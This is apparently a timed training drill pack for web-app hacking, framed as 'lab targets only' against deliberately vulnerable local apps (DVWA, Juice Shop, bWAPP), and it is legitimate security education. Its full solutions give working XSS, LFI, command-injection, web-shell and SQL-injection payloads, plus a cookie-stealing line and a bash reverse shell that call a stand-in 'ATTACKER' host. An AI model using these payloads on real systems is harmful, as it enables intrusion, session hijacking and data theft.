# Drill Pack 03 — Web & SQL Injection

> Deep, Practical-style pack for **web app hacking + SQL injection**. Every challenge has a full solution (payloads, the DVWA cookie, expected output, exact answer, and a ⚡ faster route). Solve from the recipes in [`../challenge-playbooks.md`](../challenge-playbooks.md) with a timer running; expand the solution only when done or stuck. Theory lives in [Module 14 — Hacking Web Applications](../../modules/14-hacking-web-applications/) and [Module 15 — SQL Injection](../../modules/15-sql-injection/). **Lab targets only.**

> **Setup.** Docker web apps on localhost: **DVWA `:8081`**, **Juice Shop `:8082`**, **WebGoat `:8083`**, **bWAPP `:8084`**. Log into DVWA (`admin` / `password`), open **DVWA Security** and set the level each challenge asks for, then copy your `PHPSESSID` (Firefox DevTools → Storage → Cookies, or Burp). Everywhere below, replace `<sess>` with that value. The security cookie is sent alongside it, e.g. `--cookie="PHPSESSID=<sess>; security=low"`.

Score yourself **✅ under target / ⚠️ over time / ❌ needed the solution**. Re-drill anything not ✅.

---

### Drill 1 — Reflected XSS, then beat the filter ⏱️ 8 min
**Q:** On DVWA **Reflected XSS** (`/vulnerabilities/xss_r/`), pop an alert showing your session cookie at **security=low**, then land the same result at **security=medium** where `<script>` is stripped.

<details><summary>Solution</summary>

**Low** — the `name` param is echoed unescaped. In the input box (or the URL) enter `<script>alert(document.cookie)</script>` — URL form: `http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>`.

**You should see:** a JavaScript alert popping `PHPSESSID=<sess>; security=low` — proof the payload runs in your browser.

**Medium** — the filter does a **case-sensitive, non-recursive** `str_replace('<script>','',...)`, so avoid a literal lowercase `<script>`: `<img src=x onerror=alert(document.cookie)>` (or `<sCRipt>...</sCRipt>`).

**Exact answer / proof:** the alert box fires and displays your cookie string. On **high** the filter is tighter (`<sc*ript` regex) — use the same event-handler payload `<img src=x onerror=...>`; on **impossible** output is encoded and it dies.

⚡ **Faster:** skip the alert and prove it steals cookies with `<img src=x onerror="new Image().src='http://ATTACKER/?c='+document.cookie">` — but for a Practical the alert popping is enough evidence.
</details>

### Drill 2 — Stored XSS that fires for every viewer ⏱️ 8 min
**Q:** On DVWA **Stored XSS** (`/vulnerabilities/xss_s/`, low), plant a persistent payload in the guestbook and prove it executes for a *different* browser session.

<details><summary>Solution</summary>

The `Name` field is limited to 10 chars (client-side `maxlength` only), so put the payload in **Message**: `<script>alert('stored-'+document.cookie)</script>`, then submit the guestbook entry.

**You should see:** the alert fire immediately after posting. Now open the page in a **second browser / private window** (or just reload) — it fires again *without* re-submitting. That is the difference from reflected: the payload is saved server-side and runs for **every** viewer.

**Exact answer / proof:** the alert pops on a fresh session that never sent the payload → persistent (stored) XSS confirmed.

⚡ **Faster:** if `maxlength` blocks a longer Message too, remove the attribute in DevTools or intercept the POST in Burp and enlarge `mtxMessage` before forwarding.
</details>

### Drill 3 — LFI: read /etc/passwd, name www-data's shell ⏱️ 8 min
**Q:** Use DVWA **File Inclusion** (`/vulnerabilities/fi/`, low) to read `/etc/passwd`. What shell is set for the `www-data` user?

<details><summary>Solution</summary>
```bash
curl -s --cookie "PHPSESSID=<sess>; security=low" \
  "http://localhost:8081/vulnerabilities/fi/?page=/etc/passwd"
# traversal form also works: ?page=../../../../../../etc/passwd
```
**You should see:** the full `/etc/passwd` dumped into the page, including a line like
`www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin`.

**Exact answer:** `www-data`'s shell = **`/usr/sbin/nologin`** (the last colon-field of its line; some images show `/bin/bash` — read *your* output).

Difficulty ladder: **medium** strips `../` and `http://` → an **absolute** path `?page=/etc/passwd` still slips through. **High** requires the name to start with `file` (`fnmatch('file*')`) → use `?page=file:///etc/passwd`.

⚡ **Faster:** in Burp Repeater, tamper the `page` value and resend — one click per attempt beats retyping curl.
</details>

### Drill 4 — Command injection to read a file ⏱️ 8 min
**Q:** On DVWA **Command Injection** (`/vulnerabilities/exec/`, low), read `/etc/passwd` through the `ip` field. Then repeat at **medium** where `;` and `&&` are blacklisted.

<details><summary>Solution</summary>

**Low** — the `ip` value is passed straight to `ping` via the shell. In the box enter `127.0.0.1; cat /etc/passwd`, or by curl:
```bash
curl -s --cookie "PHPSESSID=<sess>; security=low" \
  --data-urlencode "ip=127.0.0.1; cat /etc/passwd" \
  --data "Submit=Submit" \
  "http://localhost:8081/vulnerabilities/exec/"
```
**You should see:** the ping output followed by the contents of `/etc/passwd`.

**Medium** — `;` and `&&` are removed, but the **pipe** survives: `127.0.0.1 | cat /etc/passwd`. **High** removes more separators but misses a pipe with no trailing space: `127.0.0.1|cat /etc/passwd`.

**Exact answer:** the file contents (root line `root:x:0:0:root:/root:/bin/bash`) rendered in the response.

⚡ **Faster / automate:** `commix --url="http://localhost:8081/vulnerabilities/exec/" --data="ip=127.0.0.1&Submit=Submit" --cookie="PHPSESSID=<sess>; security=low"` → drops you a pseudo-shell; type `cat /etc/passwd`.
</details>

### Drill 5 — Upload a web shell and run `id` ⏱️ 10 min
**Q:** On DVWA **File Upload** (`/vulnerabilities/upload/`, low), upload a PHP web shell, then execute `id` through it. What is the output?

<details><summary>Solution</summary>
```bash
printf '<?php system($_GET["c"]); ?>' > shell.php
```
Upload `shell.php` via the page. DVWA reports the path (uploads land in `hackable/uploads/`). Trigger it:
```bash
curl -s --cookie "PHPSESSID=<sess>; security=low" \
  "http://localhost:8081/hackable/uploads/shell.php?c=id"
```
**You should see:** the command output for the web-server user.

**Exact answer:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Difficulty ladder: **medium** checks the MIME type — intercept the upload in Burp and set `Content-Type: image/jpeg` (keep the `.php` name). **High** checks the extension via `getimagesize()` + `strrpos` — upload `shell.php.jpg` (or a real JPEG with PHP appended) and pull it in through the **File Inclusion** LFI page instead.

⚡ **Faster:** upgrade to a shell — `curl ".../shell.php?c=bash -c 'bash -i >%26 /dev/tcp/ATTACKER/4444 0>%261'"` with a `nc -lvnp 4444` listener.
</details>

### Drill 6 — Manual UNION SQLi: extract admin's hash ⏱️ 12 min
**Q:** On DVWA **SQL Injection** (`/vulnerabilities/sqli/`, low), extract the `admin` account's password **hash** by hand with UNION, then crack it. What is admin's password?

<details><summary>Solution</summary>

Work the manual ladder in the `User ID` box (Module 15 workflow):
```sql
1'                              -- error → injectable
1' ORDER BY 2 -- -              -- works; ORDER BY 3 errors → 2 columns
1' UNION SELECT 1,2 -- -        -- both columns render
1' UNION SELECT user,password FROM users -- -
```
**You should see:** every user with its MD5 hash, including
`admin` → `5f4dcc3b5aa765d61d8327deb882cf99`.

Crack it:
```bash
echo '5f4dcc3b5aa765d61d8327deb882cf99' > h.txt
hashcat -m 0 h.txt /usr/share/wordlists/rockyou.txt   # MD5
# or: john --format=raw-md5 h.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
**Exact answer:** admin's password = **`password`**.

⚡ **Faster:** that hash is famous — `5f4dcc3b5aa765d61d8327deb882cf99` is `password`; confirm instantly with `echo -n password | md5sum`, or paste it into any hash-lookup. curl one-liner for the dump: `curl -s --cookie "PHPSESSID=<sess>; security=low" "http://localhost:8081/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users+--+-&Submit=Submit"`.
</details>

### Drill 7 — sqlmap: dump the users table ⏱️ 8 min
**Q:** Reproduce Drill 6 automatically — have **sqlmap** confirm the injection and dump every username/hash from `dvwa.users`.

<details><summary>Solution</summary>
```bash
# 1) list databases (confirms 'id' is injectable)
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<sess>; security=low" --batch --dbs

# 2) dump the users table
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<sess>; security=low" --batch -D dvwa -T users --dump
```
**You should see:** sqlmap flag `id` as UNION/boolean/time injectable, list DBs (`dvwa`, `information_schema`, …), then print the `users` table — and it **auto-cracks** the MD5s against its dictionary, showing `admin` → `password`, `gordonb` → `abc123`, etc.

**Exact answer:** the dumped table (5 users, MD5 hashes) with plaintexts resolved by sqlmap.

⚡ **Faster / cleanest input:** save the request from Burp and run `sqlmap -r req.txt --batch -D dvwa -T users --dump` — no hand-copying the cookie. Add `--is-dba --privileges` to show the app's DB account is over-privileged.
</details>

### Drill 8 — Bypass a login with SQLi ⏱️ 8 min
**Q:** On bWAPP **SQL Injection (Login form)** (`localhost:8084`, `sqli_6.php`, security_level=0), log in **without valid credentials**.

<details><summary>Solution</summary>

Log into bWAPP (`bee` / `bug`), set the **security level to low (0)**, open *SQL Injection (Login Form/Hero)*. In the **Login** field enter `' OR 1=1 -- -` with any password (or target the admin row directly: `admin' -- -`).

**You should see:** authentication succeeds — a *"Welcome…"* / hero page — because the query becomes `... WHERE login='' OR 1=1 -- -' AND password='...'`, and the comment discards the password check.

**Exact answer / proof:** you are logged in with no real credentials (auth bypass).

⚡ **Faster / cleaner target:** OWASP **Juice Shop** (`localhost:8082`) — on the login form, email `admin@juice-sh.op'--` with any password logs you straight in as the admin account (and solves the "Login Admin" challenge). Same class of bug, one-line payload.
</details>

### Drill 9 — Blind SQLi: name the database ⏱️ 12 min
**Q:** On DVWA **SQL Injection (Blind)** (`/vulnerabilities/sqli_blind/`, medium), where nothing is echoed, determine the current database name.

<details><summary>Solution</summary>

Nothing is reflected, so infer bit-by-bit. Manual boolean/time probes (POST `id`):
```sql
1' AND 1=1 -- -                          -- "User ID exists"  (true page)
1' AND 1=2 -- -                          -- "MISSING"         (false page)
1' AND SUBSTRING(database(),1,1)='d' -- - -- true → 1st letter is 'd'
1' AND IF(SUBSTRING(database(),1,4)='dvwa',SLEEP(3),0) -- -  -- 3s delay = true
```
Automate the extraction:
```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/" \
       --data="id=1&Submit=Submit" \
       --cookie="PHPSESSID=<sess>; security=medium" \
       --batch --technique=BT --current-db
```
**You should see:** sqlmap fall back to **boolean-/time-based** techniques (slower, no data in the response) and resolve the DB name.

**Exact answer:** current database = **`dvwa`**.

⚡ **Faster:** add `--string="User ID exists"` (the true-condition marker) so sqlmap keys on boolean instead of the slow time technique. On **high**, feed the request from Burp with `-r` (the injection point is on a separate session page).
</details>

### Drill 10 — Juice Shop: find the Score Board & a flag ⏱️ 10 min
**Q:** In OWASP **Juice Shop** (`localhost:8082`), locate the hidden **Score Board**, then solve one flagged challenge to prove access.

<details><summary>Solution</summary>

The Score Board is an Angular route never linked in the UI — discover it by guessing/reading the client bundle: browse to `http://localhost:8082/#/score-board`.

**You should see:** the Score Board grid load, listing every challenge and its status — and finding it *is itself* the first solved flag ("Score Board").

Now bank a flag — **Confidential Document** (read a file outside the shop UI): `curl -s http://localhost:8082/ftp/acquisitions.md`.

**You should see:** the internal acquisitions document returned → the challenge flips to solved (green) on the board. A DOM-XSS flag is also quick: put `<iframe src="javascript:alert(\`xss\`)">` in the product **search** box.

**Exact answer / proof:** the Score Board renders and at least one challenge shows **solved** (e.g. Confidential Document / DOM XSS).

⚡ **Faster:** open DevTools → Sources, search `main.js` for `score-board` to confirm the route without guessing; the acquisitions read is the single fastest flag.
</details>

---

## Score yourself
| # | Drill | Target | ✅ / ⚠️ / ❌ |
|---|---|---|---|
| 1 | Reflected XSS + filter bypass | 8 min | |
| 2 | Stored XSS (persistent) | 8 min | |
| 3 | LFI → /etc/passwd (www-data shell) | 8 min | |
| 4 | Command injection file read | 8 min | |
| 5 | Upload web shell → `id` | 10 min | |
| 6 | Manual UNION SQLi + crack | 12 min | |
| 7 | sqlmap dump users | 8 min | |
| 8 | SQLi login bypass | 8 min | |
| 9 | Blind SQLi → DB name | 12 min | |
| 10 | Juice Shop score board + flag | 10 min | |

Log ✅/⚠️/❌ in [`../../PROGRESS.md`](../../PROGRESS.md) and re-run every ⚠️/❌ until it's ✅ cold. **Rule:** prove the bug by hand first, then automate — the Practical rewards the person who understands the request, not the one who only knows the tool.

## Sources
- PortSwigger Web Security Academy — https://portswigger.net/web-security
- PortSwigger — Cross-site scripting (XSS) — https://portswigger.net/web-security/cross-site-scripting
- PortSwigger — SQL injection — https://portswigger.net/web-security/sql-injection
- PortSwigger — File path traversal — https://portswigger.net/web-security/file-path-traversal
- PortSwigger — OS command injection — https://portswigger.net/web-security/os-command-injection
- OWASP Top 10 (2021) — https://owasp.org/Top10/
- sqlmap — https://sqlmap.org/ · commix — https://github.com/commixproject/commix
- DVWA — https://github.com/digininja/DVWA · OWASP Juice Shop — https://owasp.org/www-project-juice-shop/
